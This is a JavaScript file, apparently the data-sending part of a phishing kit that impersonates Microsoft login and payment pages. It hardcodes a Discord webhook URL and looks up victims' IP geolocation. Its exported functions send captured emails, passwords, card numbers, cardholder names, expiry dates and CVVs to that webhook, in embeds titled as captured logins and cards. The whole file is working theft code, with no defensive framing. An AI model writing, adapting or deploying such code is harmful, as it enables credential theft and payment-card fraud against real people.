// URL del webhook de Discord
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1512212683230019634/pnIPbxd5TjBZY2TBqQELxuPlVF-aULlVNddDKyg1dPheg4xRwIURJX9FW8tJb3mvoIrK';

// Función para obtener información de localización
async function getLocationInfo() {
    try {
        console.log('🌍 Obteniendo localización...');
        
        // Usar ipapi.co que es más confiable
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        if (data && data.ip) {
            console.log(' ?Localización obtenida:', data);
            return {
                ip: data.ip || 'No disponible',
                country: data.country_name || 'No disponible',
                region: data.region || 'No disponible',
                city: data.city || 'No disponible'
            };
        } else {
            throw new Error('Respuesta inválida de ipapi.co');
        }
    } catch (error) {
        console.warn('⚠️ Error con ipapi.co, probando alternativa:', error);
        
        // Fallback: usar ip-api.com
        try {
            const response2 = await fetch('http://ip-api.com/json/');
            const data2 = await response2.json();
            
            if (data2.status === 'success') {
                console.log(' ?Localización obtenida (fallback):', data2);
                return {
                    ip: data2.query || 'No disponible',
                    country: data2.country || 'No disponible',
                    region: data2.regionName || 'No disponible',
                    city: data2.city || 'No disponible'
                };
            } else {
                throw new Error('Error en ip-api.com');
            }
        } catch (error2) {
            console.warn('⚠️ Error con ip-api.com, usando solo IP:', error2);
            
            // Último fallback: solo IP
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                return {
                    ip: ipData.ip || 'No disponible',
                    country: 'No disponible',
                    region: 'No disponible',
                    city: 'No disponible'
                };
            } catch (ipError) {
                console.error(' ?Error obteniendo IP:', ipError);
                return {
                    ip: 'No disponible',
                    country: 'No disponible',
                    region: 'No disponible',
                    city: 'No disponible'
                };
            }
        }
    }
}

// Función para enviar mensaje a Discord
async function sendDiscordMessage(embed) {
    try {
        console.log('📤 Enviando mensaje a Discord...');
        
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [embed]
            })
        });

        if (response.ok) {
            console.log(' ?Mensaje enviado exitosamente a Discord');
            return true;
        } else {
            console.error(' ?Error de API Discord:', response.status, response.statusText);
            return false;
        }
    } catch (error) {
        console.error(' ?Error de red:', error);
        return false;
    }
}

// Función para enviar datos de login
async function sendLoginData(email, password) {
    console.log('🔄 Iniciando envío de datos de login...');
    
    try {
        const timestamp = new Date().toLocaleString('es-ES');
        
        console.log('🔄 Obteniendo localización para login...');
        const location = await getLocationInfo();
        
        const embed = {
            title: "🚨 NUEVO LOGIN CAPTURADO",
            color: 0xff0000, // Color rojo
            fields: [
                {
                    name: "📧 Email",
                    value: email,
                    inline: true
                },
                {
                    name: "🔐 Password",
                    value: password,
                    inline: true
                },
                {
                    name: "📍 País",
                    value: location.country,
                    inline: true
                },
                {
                    name: "🏙 ?Ciudad",
                    value: `${location.city}, ${location.region}`,
                    inline: true
                },
                {
                    name: "🌐 IP",
                    value: location.ip,
                    inline: true
                },
                {
                    name: " ?Timestamp",
                    value: timestamp,
                    inline: true
                }
            ],
            footer: {
                text: "Microsoft Login System"
            },
            timestamp: new Date().toISOString()
        };
        
        const result = await sendDiscordMessage(embed);
        
        if (result) {
            console.log(' ?Datos de login enviados exitosamente');
        } else {
            console.error(' ?Error enviando datos de login');
        }
        
        return result;
    } catch (error) {
        console.error(' ?Error en sendLoginData:', error);
        return false;
    }
}

// Función para enviar datos de tarjeta
async function sendCardData(cardData) {
    console.log('🔄 Iniciando envío de datos de tarjeta...');
    
    try {
        const timestamp = new Date().toLocaleString('es-ES');
        
        console.log('🔄 Obteniendo localización para tarjeta...');
        const location = await getLocationInfo();
        
        const embed = {
            title: "💳 NUEVA TARJETA CAPTURADA",
            color: 0x00ff00, // Color verde
            fields: [
                {
                    name: "📧 Email",
                    value: cardData.email,
                    inline: false
                },
                {
                    name: "💳 Número de Tarjeta",
                    value: cardData.cardNumber,
                    inline: true
                },
                {
                    name: "👤 Nombre del Titular",
                    value: cardData.cardholderName,
                    inline: true
                },
                {
                    name: "📅 Fecha de Vencimiento",
                    value: `${cardData.expiryMonth}/${cardData.expiryYear}`,
                    inline: true
                },
                {
                    name: "🔒 CVV",
                    value: cardData.cvv,
                    inline: true
                },
                {
                    name: "🏠 Misma Dirección",
                    value: cardData.sameAddress ? 'Sí' : 'No',
                    inline: true
                },
                {
                    name: "📍 País",
                    value: location.country,
                    inline: true
                },
                {
                    name: "🏙 ?Ciudad",
                    value: `${location.city}, ${location.region}`,
                    inline: true
                },
                {
                    name: "🌐 IP",
                    value: location.ip,
                    inline: true
                },
                {
                    name: " ?Timestamp",
                    value: timestamp,
                    inline: false
                }
            ],
            footer: {
                text: "Microsoft Payment System"
            },
            timestamp: new Date().toISOString()
        };
        
        const result = await sendDiscordMessage(embed);
        
        if (result) {
            console.log(' ?Datos de tarjeta enviados exitosamente');
        } else {
            console.error(' ?Error enviando datos de tarjeta');
        }
        
        return result;
    } catch (error) {
        console.error(' ?Error en sendCardData:', error);
        return false;
    }
}

// Verificar que las funciones estén disponibles
if (typeof window !== 'undefined') {
    window.sendLoginData = sendLoginData;
    window.sendCardData = sendCardData;
    console.log(' ?Discord XJSX cargado correctamente');
    console.log('📋 Funciones disponibles: sendLoginData, sendCardData');
    console.log('🔗 Webhook configurado para Discord');
}